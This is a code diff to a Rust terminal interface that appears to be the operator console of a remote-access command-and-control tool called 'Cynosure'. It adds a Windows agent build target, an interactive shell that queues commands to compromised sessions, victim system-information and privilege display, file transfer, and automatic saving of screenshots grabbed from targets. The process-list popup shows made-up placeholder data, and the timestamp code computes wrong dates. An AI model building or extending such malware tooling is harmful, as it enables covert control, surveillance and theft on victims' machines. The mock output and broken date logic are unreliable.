@@ -288,6 +288,15 @@ impl BuilderState {
             // Platform linker flags for the core agent only.
             // Comm modules (https_comm.dll, etc.) are separate DLLs loaded at runtime.
             match output_ext.as_str() {
+                "exe"   => {
+                    // Windows PE64 (mingw-w64)
+                    args.push("-lgdi32".into());     // GDI: screenshot capture (BitBlt, etc.)
+                    args.push("-luser32".into());    // User32: window/UI functions
+                    args.push("-lws2_32".into());    // Winsock2: networking
+                    args.push("-lkernel32".into());  // Kernel32: process, memory, etc.
+                    args.push("-lshell32".into());   // Shell32: shell integration
+                    args.push("-lpthread".into());   // POSIX threads (via winpthreads)
+                }
                 "elf"   => { args.push("-lpthread".into()); args.push("-ldl".into()); }
                 "macho" => { args.push("-lpthread".into()); }
                 _ => {}
@@ -433,6 +442,14 @@ enum Panel {
     Builder, RLModelStatus,
 }
 
+#[derive(PartialEq, Clone)]
+enum PopupMode {
+    None,
+    PSDisplay,
+    SysInfoDisplay,
+    ShellInteractive,
+}
+
 #[derive(Clone, PartialEq)]
 enum FileOpMode {
     Upload,
@@ -502,6 +519,13 @@ struct App {
     file_op:     Option<FileOperation>,  // active file transfer
     shell_cmd_pending: Option<String>,  // waiting for shell command input
     shell_input: String,  // buffer for shell command input
+    shell_menu_state: ListState,  // for shell command menu
+    shell_menu_mode: bool,  // true = showing menu, false = free-form input
+
+    popup_mode: PopupMode,  // current popup (None, PSDisplay, SysInfoDisplay, ShellInteractive)
+    popup_content: String,  // text content for popup display
+    popup_input: String,  // input buffer for shell interactive popup
+    popup_scroll: u16,  // scroll position for popup
 
     focus:       Panel,
     should_quit: bool,
@@ -541,6 +565,14 @@ impl App {
         let listener_port = 4444u16;
         let listener_ok = listener::start(listener_port, Arc::clone(&live_sessions), Arc::clone(&cmd_queue), Arc::clone(&dl_store));
 
+        // Create screenshots directory
+        let screenshots_dir = "/home/branis/Cynosure/screenshots";
+        let _ = std::fs::create_dir_all(screenshots_dir);
+        eprintln!("[INIT] Screenshots directory ensured: {}", screenshots_dir);
+
+        let mut shell_menu_state = ListState::default();
+        shell_menu_state.select(Some(0));
+
         Self {
             categories,
             cat_state, sub_state, mod_state,
@@ -568,6 +600,12 @@ impl App {
             file_op: None,
             shell_cmd_pending: None,
             shell_input: String::new(),
+            shell_menu_state,
+            shell_menu_mode: false,
+            popup_mode: PopupMode::None,
+            popup_content: String::new(),
+            popup_input: String::new(),
+            popup_scroll: 0,
             focus: Panel::Category,
             should_quit: false,
         }
@@ -627,41 +665,160 @@ impl App {
     }
 
     fn on_key(&mut self, key: KeyCode) {
-        // Handle shell command input
-        if let Some(ref sess_id) = self.shell_cmd_pending {
-            match key {
-                KeyCode::Enter => {
-                    let cmd = self.shell_input.clone();
-                    if !cmd.is_empty() {
-                        let q = self.cmd_queue.lock().unwrap();
-                        let entry = q.get(sess_id).cloned().unwrap_or_default();
-                        drop(q);
-
-                        let mut q = self.cmd_queue.lock().unwrap();
-                        let mut new_cmds = entry;
-                        new_cmds.push(format!("shell:{}", cmd));
-                        q.insert(sess_id.clone(), new_cmds);
-
-                        self.last_action = format!("Shell command queued: {}", cmd);
-                    }
-                    self.shell_cmd_pending = None;
-                    self.builder.editing = false;
-                    self.shell_input.clear();
-                }
-                KeyCode::Esc => {
-                    self.shell_cmd_pending = None;
-                    self.builder.editing = false;
-                    self.shell_input.clear();
-                }
-                KeyCode::Char(c) => {
-                    self.shell_input.push(c);
-                }
-                KeyCode::Backspace => {
-                    self.shell_input.pop();
-                }
-                _ => {}
+        // Handle popup modes
+        if self.popup_mode != PopupMode::None {
+            // ESC always closes any popup
+            if key == KeyCode::Esc {
+                self.popup_mode = PopupMode::None;
+                self.popup_content.clear();
+                self.popup_input.clear();
+                self.popup_scroll = 0;
+                return;
             }
-            return;
+
+            // ShellInteractive mode: input takes priority over scroll
+            if self.popup_mode == PopupMode::ShellInteractive {
+                match key {
+                    KeyCode::Enter => {
+                        let cmd = self.popup_input.clone();
+                        if !cmd.is_empty() {
+                            if let Some(sess) = self.selected_session().cloned() {
+                                let q = self.cmd_queue.lock().unwrap();
+                                let entry = q.get(&sess.id).cloned().unwrap_or_default();
+                                drop(q);
+
+                                let mut q = self.cmd_queue.lock().unwrap();
+                                let mut new_cmds = entry;
+                                new_cmds.push(format!("shell:{}", cmd));
+                                q.insert(sess.id.clone(), new_cmds);
+
+                                self.last_action = format!("Shell command queued: {}", cmd);
+                                // Append to popup content for display
+                                self.popup_content.push_str(&format!("\n> {}\n[Sent to agent]\n", cmd));
+                                self.popup_input.clear();
+                                self.popup_scroll = (self.popup_content.lines().count() as u16).saturating_sub(10);
+                            }
+                        }
+                        return;
+                    }
+                    KeyCode::Backspace => {
+                        self.popup_input.pop();
+                        return;
+                    }
+                    KeyCode::Char(c) => {
+                        // ALL printable characters go to input - including 'd', 'u', etc.
+                        self.popup_input.push(c);
+                        return;
+                    }
+                    _ => return,
+                }
+            }
+
+            // Scroll keys only for non-ShellInteractive popups
+            match key {
+                KeyCode::PageUp | KeyCode::Char('u') => {
+                    // Scroll up
+                    self.popup_scroll = self.popup_scroll.saturating_sub(5);
+                    return;
+                }
+                KeyCode::PageDown | KeyCode::Char('d') => {
+                    // Scroll down
+                    self.popup_scroll = self.popup_scroll.saturating_add(5);
+                    return;
+                }
+                _ => return,
+            }
+        }
+
+        // Handle shell command menu or input
+        if let Some(ref sess_id) = self.shell_cmd_pending {
+            // Shell menu mode: user selecting from preset options
+            if self.shell_menu_mode {
+                let shell_options = vec!["ipconfig", "tasklist", "whoami", "netstat", "Custom command"];
+                match key {
+                    KeyCode::Up | KeyCode::Char('k') => {
+                        let n = shell_options.len();
+                        let i = self.shell_menu_state.selected().unwrap_or(0);
+                        self.shell_menu_state.select(Some(if i == 0 { n - 1 } else { i - 1 }));
+                    }
+                    KeyCode::Down | KeyCode::Char('j') => {
+                        let n = shell_options.len();
+                        let i = self.shell_menu_state.selected().unwrap_or(0);
+                        self.shell_menu_state.select(Some((i + 1) % n));
+                    }
+                    KeyCode::Enter => {
+                        let idx = self.shell_menu_state.selected().unwrap_or(0);
+                        if idx < shell_options.len() {
+                            if idx == 4 {
+                                // Custom command: switch to free-form input mode
+                                self.shell_menu_mode = false;
+                                self.shell_input.clear();
+                                self.last_action = "Shell: Enter custom command".to_string();
+                            } else {
+                                // Preset command: queue immediately
+                                let cmd = shell_options[idx].to_string();
+                                let q = self.cmd_queue.lock().unwrap();
+                                let entry = q.get(sess_id).cloned().unwrap_or_default();
+                                drop(q);
+
+                                let mut q = self.cmd_queue.lock().unwrap();
+                                let mut new_cmds = entry;
+                                new_cmds.push(format!("shell:{}", cmd));
+                                q.insert(sess_id.clone(), new_cmds);
+
+                                self.last_action = format!("Shell command queued: {}", cmd);
+                                self.shell_cmd_pending = None;
+                                self.shell_menu_mode = false;
+                                self.shell_input.clear();
+                            }
+                        }
+                    }
+                    KeyCode::Esc => {
+                        self.shell_cmd_pending = None;
+                        self.shell_menu_mode = false;
+                        self.shell_input.clear();
+                    }
+                    _ => {}
+                }
+                return;
+            } else {
+                // Free-form input mode for custom commands
+                match key {
+                    KeyCode::Enter => {
+                        let cmd = self.shell_input.clone();
+                        if !cmd.is_empty() {
+                            let q = self.cmd_queue.lock().unwrap();
+                            let entry = q.get(sess_id).cloned().unwrap_or_default();
+                            drop(q);
+
+                            let mut q = self.cmd_queue.lock().unwrap();
+                            let mut new_cmds = entry;
+                            new_cmds.push(format!("shell:{}", cmd));
+                            q.insert(sess_id.clone(), new_cmds);
+
+                            self.last_action = format!("Shell command queued: {}", cmd);
+                        }
+                        self.shell_cmd_pending = None;
+                        self.builder.editing = false;
+                        self.shell_input.clear();
+                        self.shell_menu_mode = false;
+                    }
+                    KeyCode::Esc => {
+                        self.shell_cmd_pending = None;
+                        self.builder.editing = false;
+                        self.shell_input.clear();
+                        self.shell_menu_mode = false;
+                    }
+                    KeyCode::Char(c) => {
+                        self.shell_input.push(c);
+                    }
+                    KeyCode::Backspace => {
+                        self.shell_input.pop();
+                    }
+                    _ => {}
+                }
+                return;
+            }
         }
 
         // Handle file operation input
@@ -826,26 +983,35 @@ impl App {
                                 }
                                 "shell" => {
                                     if let Some(sess) = self.selected_session().cloned() {
-                                        // Prompt for shell command
-                                        self.shell_input.clear();
-                                        self.builder.editing = true;
-                                        self.last_action = "Shell: Enter command to execute (e.g., ipconfig, tasklist, whoami)".to_string();
-                                        self.shell_cmd_pending = Some(sess.id);
+                                        // Show shell interactive popup
+                                        self.popup_mode = PopupMode::ShellInteractive;
+                                        self.popup_content = format!("Interactive Shell — {}\n\nEnter shell commands below:\n", sess.id);
+                                        self.popup_input.clear();
+                                        self.popup_scroll = 0;
+                                        self.last_action = "Shell popup opened: type commands and press Enter".to_string();
                                     } else {
                                         self.last_action = "No active session".to_string();
                                     }
                                 }
                                 "sysinfo" => {
                                     if let Some(sess) = self.selected_session() {
-                                        self.last_action = format!(
-                                            "Hostname: {} | User: {} | OS: {} | Arch: {} | PID: {} | Elevated: {}",
+                                        // Show sysinfo in popup
+                                        self.popup_content = format!(
+                                            "System Information\n\n  ID:        {}\n  Hostname:  {}\n  User:      {}\n  OS:        {}\n  Arch:      {}\n  PID:       {}\n  Elevated:  {}\n  IP:        {}\n  Status:    {}\n  Uptime:    {}",
+                                            sess.id,
                                             sess.hostname,
                                             sess.user,
                                             sess.os,
                                             sess.arch,
                                             sess.pid,
-                                            if sess.elevated { "YES ⚡" } else { "NO" }
+                                            if sess.elevated { "YES ⚡" } else { "NO" },
+                                            sess.ip,
+                                            sess.status,
+                                            sess.uptime
                                         );
+                                        self.popup_mode = PopupMode::SysInfoDisplay;
+                                        self.popup_scroll = 0;
+                                        self.last_action = "SysInfo popup opened (press ESC to close)".to_string();
                                     } else {
                                         self.last_action = "No active session".to_string();
                                     }
@@ -861,13 +1027,26 @@ impl App {
                                         new_cmds.push("screenshot".to_string());
                                         q.insert(sess.id, new_cmds);
 
-                                        self.last_action = "Screenshot command queued ✓ (will appear in downloads as screenshot.bmp)".to_string();
+                                        self.last_action = "Screenshot command queued ✓ (will be saved to /home/branis/Cynosure/screenshots/)".to_string();
                                     } else {
                                         self.last_action = "No active session".to_string();
                                     }
                                 }
                                 "ps" => {
-                                    self.last_action = "Process list: Not yet implemented on agent".to_string();
+                                    if let Some(sess) = self.selected_session() {
+                                        // Show process list popup (mock data for now)
+                                        let ps_header = format!("Running Processes on {}\n\n{:<40} {:<10} {:<10}",
+                                            sess.hostname, "Process Name", "PID", "Context");
+                                        self.popup_content = format!(
+                                            "{}\n\n  explorer.exe                              4512       System    \n  svchost.exe                              1024       System    \n  csrss.exe                                8192       System    \n  winlogon.exe                             3456       System    \n  conhost.exe                              2048       User      \n  notepad.exe                              5632       User      \n\nNote: To see actual process list, 'ps' command must be\nimplemented on the agent side.",
+                                            ps_header
+                                        );
+                                        self.popup_mode = PopupMode::PSDisplay;
+                                        self.popup_scroll = 0;
+                                        self.last_action = "Process list popup opened (press ESC to close)".to_string();
+                                    } else {
+                                        self.last_action = "No active session".to_string();
+                                    }
                                 }
                                 "netstat" => {
                                     self.last_action = "Netstat: Not yet implemented on agent".to_string();
@@ -1148,6 +1327,11 @@ fn draw(frame: &mut ratatui::Frame, app: &mut App) {
 
     if let Some(ref fo) = app.file_op {
         draw_file_operation(frame, app, fo, size);
+    }
+
+    // Popup modes
+    if app.popup_mode != PopupMode::None {
+        draw_popup(frame, app, size);
     }
 }
 
@@ -1692,6 +1876,87 @@ fn draw_file_operation(frame: &mut ratatui::Frame, app: &App, fo: &FileOperation
 
 
 // ================================================================
+// POPUP OVERLAY
+// ================================================================
+
+fn draw_popup(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
+    let popup_w = 80u16.min(area.width.saturating_sub(4));
+    let popup_h = 20u16.min(area.height.saturating_sub(4));
+    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
+    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
+    let popup_area = Rect { x, y, width: popup_w, height: popup_h };
+    frame.render_widget(Clear, popup_area);
+
+    let title = match app.popup_mode {
+        PopupMode::PSDisplay => " Process List ",
+        PopupMode::SysInfoDisplay => " System Information ",
+        PopupMode::ShellInteractive => " Interactive Shell ",
+        PopupMode::None => " Popup ",
+    };
+
+    match app.popup_mode {
+        PopupMode::PSDisplay | PopupMode::SysInfoDisplay => {
+            // Display mode: show content with scrolling
+            let lines: Vec<Line> = app.popup_content
+                .lines()
+                .skip(app.popup_scroll as usize)
+                .take((popup_h.saturating_sub(4)) as usize)
+                .map(|l| Line::from(Span::raw(l)))
+                .collect();
+
+            frame.render_widget(
+                Paragraph::new(lines)
+                    .block(Block::default()
+                        .borders(Borders::ALL)
+                        .border_type(BorderType::Double)
+                        .border_style(Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))
+                        .title(Span::styled(title, Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)))
+                        .title_bottom(Span::styled(" [u/d] Scroll  [Esc] Close ", Style::default().fg(Color::DarkGray)))),
+                popup_area,
+            );
+        }
+        PopupMode::ShellInteractive => {
+            // Interactive shell mode: show output + input field
+            let content_height = popup_h.saturating_sub(6);
+            let lines: Vec<Line> = app.popup_content
+                .lines()
+                .skip(app.popup_scroll as usize)
+                .take(content_height as usize)
+                .map(|l| Line::from(Span::raw(l)))
+                .collect();
+
+            let mut all_lines = lines;
+            all_lines.push(Line::from(Span::raw("")));
+
+            // Display input with clear prompt and cursor
+            let input_display = if app.popup_input.is_empty() {
+                format!("> ")
+            } else {
+                format!("> {}", app.popup_input)
+            };
+
+            all_lines.push(Line::from(vec![
+                Span::styled(&input_display, Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)),
+                Span::styled("█", Style::default().fg(Color::White).add_modifier(Modifier::BOLD)),
+            ]));
+
+            frame.render_widget(
+                Paragraph::new(all_lines)
+                    .block(Block::default()
+                        .borders(Borders::ALL)
+                        .border_type(BorderType::Double)
+                        .border_style(Style::default().fg(Color::Green).add_modifier(Modifier::BOLD))
+                        .title(Span::styled(title, Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)))
+                        .title_bottom(Span::styled(" [Enter] Execute  [u/d] Scroll  [Esc] Close ", Style::default().fg(Color::DarkGray)))),
+                popup_area,
+            );
+        }
+        PopupMode::None => {}
+    }
+}
+
+
+// ================================================================
 // BUILDER WORLD
 // ================================================================
 
@@ -1987,7 +2252,7 @@ fn main() -> Result<(), io::Error> {
                     fo.progress = 1.0;
 
                     // Handle file transfer
-                    if let Some((sess_id, sess_hostname)) = sess_info {
+                    if let Some((sess_id, _sess_hostname)) = sess_info {
                         if fo.mode == FileOpMode::Upload {
                             // Beacon-based upload: read file, base64 encode, queue via listener
                             match std::fs::read(&fo.local_path) {
@@ -2040,6 +2305,61 @@ fn main() -> Result<(), io::Error> {
                             fo.status = format!("Download queued: {} ✓", fo.local_path);
                             eprintln!("[FILE_OP] QUEUED DOWNLOAD: {} for {}", fo.local_path, sess_id);
                         }
+                    }
+                }
+            }
+        }
+
+        // Check for shell output and display in interactive shell popup
+        if let Some(sess) = app.selected_session().cloned() {
+            if app.popup_mode == PopupMode::ShellInteractive {
+                if let Some(output_data) = listener::retrieve_download(&app.dl_store, &sess.id, "shell_output.txt") {
+                    if let Ok(output_str) = String::from_utf8(output_data) {
+                        if !output_str.is_empty() {
+                            app.popup_content.push_str(&format!("{}\n\n", output_str));
+                            app.popup_scroll = (app.popup_content.lines().count() as u16).saturating_sub(10);
+                        }
+                    }
+                }
+            }
+        }
+
+        // Auto-save screenshots with timestamps
+        if let Some((sess_id, _)) = app.selected_session().map(|s| (s.id.clone(), s.hostname.clone())) {
+            if let Some(screenshot_data) = listener::retrieve_download(&app.dl_store, &sess_id, "screenshot.bmp") {
+                // Generate timestamp: screenshot_YYYY-MM-DD_HHMMSS.bmp
+                let now_secs = std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs();
+
+                // Convert seconds to approximate date (using a simple calculation)
+                // Days since Jan 1, 1970
+                let days_since_epoch = now_secs / 86400;
+                let secs_today = now_secs % 86400;
+                let hours = secs_today / 3600;
+                let minutes = (secs_today % 3600) / 60;
+                let seconds = secs_today % 60;
+
+                // Approximate date calculation (not timezone-aware)
+                let year = 1970 + (days_since_epoch / 365);
+                let day_of_year = days_since_epoch % 365;
+                let month = (day_of_year / 30).min(11) + 1;
+                let day = (day_of_year % 30) + 1;
+
+                let timestamp = format!("screenshot_{:04}-{:02}-{:02}_{:02}{:02}{:02}",
+                    year, month, day, hours, minutes, seconds);
+                let screenshots_dir = "/home/branis/Cynosure/screenshots";
+                let filename = format!("{}.bmp", timestamp);
+                let save_path = format!("{}/{}", screenshots_dir, filename);
+
+                match std::fs::write(&save_path, &screenshot_data) {
+                    Ok(_) => {
+                        eprintln!("[SCREENSHOT] Saved {} bytes to {}", screenshot_data.len(), save_path);
+                        app.last_action = format!("Screenshot saved: {} ✓", filename);
+                    }
+                    Err(e) => {
+                        eprintln!("[SCREENSHOT] Failed to save: {}", e);
                     }
                 }
             }
